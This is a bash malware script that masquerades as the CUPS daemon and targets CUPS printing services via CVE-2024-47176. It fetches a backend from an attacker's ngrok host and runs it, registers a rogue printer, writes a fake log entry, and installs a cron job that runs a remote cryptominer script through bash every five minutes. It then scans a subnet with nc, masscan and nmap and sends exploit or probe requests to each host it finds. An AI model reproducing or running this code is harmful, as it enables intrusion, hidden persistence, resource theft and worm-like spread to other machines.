#!/bin/bash
# Disguise as CUPS process
exec -a cupsd bash -c '

# Colors
RED="\033[31m"
PURPLE="\033[35m"
GREEN="\033[32m"
RESET="\033[0m"

# Configuration
ATTACKER_IP="3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app"
IPP_PORT=631
BACKEND_URL="http://$ATTACKER_IP:8080/malicious_backend.py"
PRINTER_NAME="SECURE_UPDATER"
BACKEND_PATH="/usr/lib/cups/backend/malicious"
RETRY_FILE="/tmp/retry_vulnerable.txt"
TARGET_PORTS="22,80,443,445,631,8080"
IP_RANGE="10.0.0.0/24"
SCANNERS=("nc" "masscan" "nmap")

# Ensure dependencies
install_dependencies() {
    if ! command -v nc >/dev/null; then
        apt-get update && apt-get install -y netcat-traditional
    fi
    if ! command -v masscan >/dev/null; then
        apt-get install -y masscan || echo "masscan not installed, falling back"
    fi
    if ! command -v nmap >/dev/null; then
        apt-get install -y nmap || echo "nmap not installed, falling back"
    fi
}

# Log failed attempts
log_retry() {
    local target=$1
    local error=$2
    echo "$(date +%Y-%m-%d\ %H:%M:%S) - $target: Failed ($error)" >> "$RETRY_FILE"
}

# Exploit CVE-2024-47176 to gain initial access
exploit_cups() {
    local target_ip=$1
    local payload="POST /printers HTTP/1.1\nHost: $target_ip:$IPP_PORT\nContent-Type: application/ipp\n\n"
    payload+="\x01\x01\x00\x0B\x00\x00\x00\x01\x01"
    payload+="\x47\x00\x12attributes-charset\x00\x05utf-8"
    payload+="\x48\x00\x1Battributes-natural-language\x00\x05en-us"
    payload+="\x45\x00\x0Bprinter-uri\x00\x20ipp://$ATTACKER_IP:$IPP_PORT/printers/malicious"
    payload+="\x03"
    echo -e "${PURPLE}[$(date +%H:%M:%S)] Attempting exploit on $target_ip:$IPP_PORT${RESET}"
    if echo -e "$payload" | nc -w 1 "$target_ip" $IPP_PORT >/dev/null 2>&1; then
        echo -e "${GREEN}[$(date +%H:%M:%S)] Exploit successful on $target_ip:$IPP_PORT${RESET}"
        return 0
    else
        echo -e "[$(date +%H:%M:%S)] Exploit failed on $target_ip:$IPP_PORT"
        log_retry "$target_ip:$IPP_PORT" "Exploit failed"
        return 1
    fi
}

# Install malicious backend
install_backend() {
    if curl -s "$BACKEND_URL" -o "$BACKEND_PATH"; then
        chmod +x "$BACKEND_PATH"
        lpadmin -p "$PRINTER_NAME" -E -v "malicious://localhost" -m raw 2>/dev/null
        echo "printer $PRINTER_NAME is idle.  enabled since $(date)" >> /var/log/cups/error_log
        echo -e "${GREEN}[$(date +%H:%M:%S)] Backend installed at $BACKEND_PATH${RESET}"
    else
        echo "[$(date +%H:%M:%S)] Failed to download backend"
        log_retry "$BACKEND_URL" "Download failed"
    fi
}

# Ensure persistence
ensure_persistence() {
    if ! grep -q "$PRINTER_NAME" /etc/cups/printers.conf; then
        echo "<Printer $PRINTER_NAME>" >> /etc/cups/printers.conf
        echo "  DeviceURI malicious://localhost" >> /etc/cups/printers.conf
        echo "  State Idle" >> /etc/cups/printers.conf
        echo "  Type 4" >> /etc/cups/printers.conf
        echo "</Printer>" >> /etc/cups/printers.conf
    fi
    (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://$ATTACKER_IP:8080/miner.sh | bash") | crontab -
    echo -e "${GREEN}[$(date +%H:%M:%S)] Persistence established${RESET}"
}

# Network propagation with scanners
propagate() {
    install_dependencies
    local cycle=0
    while true; do
        ((cycle++))
        shuf -e "${SCANNERS[@]}" | while read -r scanner; do
            echo "[$(date +%H:%M:%S)] Scanning with $scanner (Cycle $cycle)"
            local targets=""
            case $scanner in
                nc)
                    targets=$(nc -z -w 1 -v $IP_RANGE $TARGET_PORTS 2>&1 | grep -E "succeeded|open" | awk '{print $2}')
                    ;;
                masscan)
                    if command -v masscan >/dev/null; then
                        targets=$(masscan $IP_RANGE -p$TARGET_PORTS --max-rate 500 | grep "open" | awk '{print $6}')
                    fi
                    ;;
                nmap)
                    if command -v nmap >/dev/null; then
                        targets=$(nmap -p $TARGET_PORTS --open -n -T3 $IP_RANGE -oG - | grep "Host:" | grep "$TARGET_PORTS/open" | awk '{print $2}')
                    fi
                    ;;
            esac
            if [ -n "$targets" ]; then
                echo -e "${RED}[$(date +%H:%M:%S)] Found vulnerable IPs: $targets${RESET}"
                for target in $targets; do
                    if [[ $target =~ ^([0-9.]+):([0-9]+)$ ]]; then
                        ip=${BASH_REMATCH[1]}
                        port=${BASH_REMATCH[2]}
                    else
                        ip=$target
                        port=631
                    fi
                    if [ "$port" == "631" ]; then
                        exploit_cups "$ip"
                    else
                        curl -s --connect-timeout 1 "http://$ip:$port" -d "cmd=whoami" >/dev/null 2>&1 &
                    fi
                done
                break
            fi
            sleep $((RANDOM % 4 + 2))
        done
        sleep $((RANDOM % 10 + 5))
    done
}

# Main execution
install_backend
ensure_persistence
propagate &

# Start malicious backend
if [ -f "$BACKEND_PATH" ]; then
    python3 "$BACKEND_PATH" &
    echo -e "${GREEN}[$(date +%H:%M:%S)] Started backend at $BACKEND_PATH${RESET}"
fi

'
